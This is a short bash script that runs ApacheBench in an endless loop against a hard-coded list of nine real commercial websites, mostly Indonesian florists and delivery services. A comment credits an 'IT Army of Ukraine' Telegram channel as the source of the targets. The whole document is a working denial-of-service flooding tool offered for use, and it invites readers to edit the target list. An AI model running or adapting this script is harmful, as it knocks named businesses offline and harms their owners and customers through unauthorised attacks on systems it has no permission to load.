#!/bin/bash

# Install apache2-utils
# apt-get install apache2-utils
# or
# dnf install httpd-tools

# Edit the list of sites according to your liking ;)
# URLs targeted from https://t.me/s/itarmyofukraine2022

sites=(
https://prestisa.com/
https://eloraflorist.com/
https://athaya.co.id/
https://irandra.com/
https://outerbloom.com/
https://nidiraflorist.com/
https://delovery.com/
https://detikflorist.com/
https://floweradvisor.co.id/
)


while true
    do
        for site in "${sites[@]}"
          do
            if [[ "${site}" != "${sites[-1]}" ]]; then
              ab -k -c 100 -n 100 "${site}" &
            else
              ab -k -c 100 -n 100 "${site}"
            fi
          done
    done
